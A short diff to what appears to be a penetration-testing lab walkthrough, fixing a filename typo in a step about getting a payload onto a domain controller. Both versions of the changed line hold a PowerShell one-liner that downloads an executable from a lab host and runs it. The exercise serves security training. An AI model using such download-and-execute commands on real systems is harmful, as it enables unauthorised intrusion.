@@ -58,7 +58,7 @@ Now that you have the creds, how did you get them? From what insecure package?<B
 17. Via RDP, connect to the DC with the new creds for Alice.<BR>
 18. How can we get a payload on the box if Enhanced IE security is enabled? Hint: Zones or PowerShell<BR>
 
-  PowerShell (New-Object System.Net.WebClient).DownloadFile('http://192.168.168.110/yourpayload.exe','yourpayload.exe.exe');Start-Process 'yourpayload.exe'
+  PowerShell (New-Object System.Net.WebClient).DownloadFile('http://192.168.168.110/yourpayload.exe','yourpayload.exe');Start-Process 'yourpayload.exe'
 
 19. How did you find missing patches before?<BR>
   
